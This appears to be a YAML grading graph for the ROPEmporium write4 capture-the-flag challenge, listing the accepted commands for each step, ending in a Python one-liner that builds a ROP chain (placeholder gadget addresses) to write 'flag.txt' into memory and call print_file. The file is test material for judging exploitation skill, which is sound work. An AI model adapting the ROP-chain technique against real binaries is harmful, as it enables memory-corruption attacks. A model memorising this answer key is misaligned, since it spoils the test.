version: '0.5'
graph:
  type: reference
challenge:
  id: ropemporium_write4
  name: ROPEmporium write4
  description: Write the string "flag.txt" into writable memory using ROP gadgets,
    then call print_file() with its address.
attacker_context:
  user: ctf-player
  access:
    method: local_shell
    credentials: null
  target:
    host: local
    path: <path-to-challenge-binary>
    architecture: <challenge-architecture>
    os: linux
goal:
  node: node5
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- man ropper
- python3
- python
- bash
- sh
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Overflow offset identified
- id: node1
  type: state
  label: Writable memory identified
- id: node2
  type: state
  label: Write gadget identified
- id: node3
  type: state
  label: print_file located
- id: node4
  type: state
  label: ROP payload crafted
- id: node5
  type: state
  label: Flag printed
edges:
- action: determine_overflow_offset
  accepted_commands:
  - gdb -q ./write4
  - ragg2 -P 200 -r > pattern.txt && ./write4 < pattern.txt
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge0
  from: start
  to: node0
- action: identify_writable_memory_region
  accepted_commands:
  - readelf -S write4
  - rabin2 -S write4
  - objdump -h write4
  transition_match:
    exit_code: 0
    stdout_regex: .*\.data.*|.*\.bss.*
    stderr_regex: .*
  id: edge1
  from: node0
  to: node1
- action: find_arbitrary_write_gadget
  accepted_commands:
  - ROPgadget --binary write4 | grep "mov .*\[.*\].*"
  - ropper --file write4 --search "mov ["
  transition_match:
    exit_code: 0
    stdout_regex: .*mov.*
    stderr_regex: .*
  id: edge2
  from: node1
  to: node2
- action: locate_print_file
  accepted_commands:
  - objdump -d write4 | grep print_file
  - rabin2 -i write4 | grep print_file
  transition_match:
    exit_code: 0
    stdout_regex: .*print_file.*
    stderr_regex: .*
  id: edge3
  from: node2
  to: node3
- action: craft_payload_to_write_flag_and_call_print_file
  accepted_commands:
  - python3 -c "from struct import pack; import sys; pad=b'A'*40; pop_r14_r15=0xPOP_R14_R15_RET;
    mov_r14_r15=0xMOV_QWORD_PTR_R14_R15_RET; pop_rdi=0xPOP_RDI_RET; data=0xDATA_ADDR;
    print_file=0xPRINT_FILE; chain=pad + pack('<Q', pop_r14_r15)+pack('<Q', data)+b'flag.txt'
    + pack('<Q', mov_r14_r15) + pack('<Q', pop_rdi)+pack('<Q', data)+pack('<Q', print_file);
    sys.stdout.buffer.write(chain)" > payload.bin
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
  id: edge4
  from: node3
  to: node4
- action: execute_payload_and_print_flag
  accepted_commands:
  - ./write4 < payload.bin
  transition_match:
    exit_code: 0
    stdout_regex: .*flag.*
    stderr_regex: .*
  id: edge5
  from: node4
  to: node5
